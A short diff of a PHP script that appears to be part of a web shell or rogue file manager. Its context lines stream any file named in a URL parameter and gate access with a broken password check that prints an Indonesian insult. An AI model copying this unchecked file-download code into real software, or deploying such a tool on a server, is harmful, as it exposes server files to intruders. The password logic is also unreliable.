@@ -273,6 +273,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     header('Content-Length: ' . filesize($file));
     readfile($file);
     exit;
+}
 } if(isset($_POST['pass']) && !empty($_POST['pass']) && isset($_POST['username']) && !empty($_POST['username']) ){ $pass = $_POST['pass']; $user = $_POST['username']; if($pass > 50){ die("<center><b><font color='red'>Password yang Anda masukkan salah Goblok..!".$warn."</font></b></center> ");
 ?>
 <html>
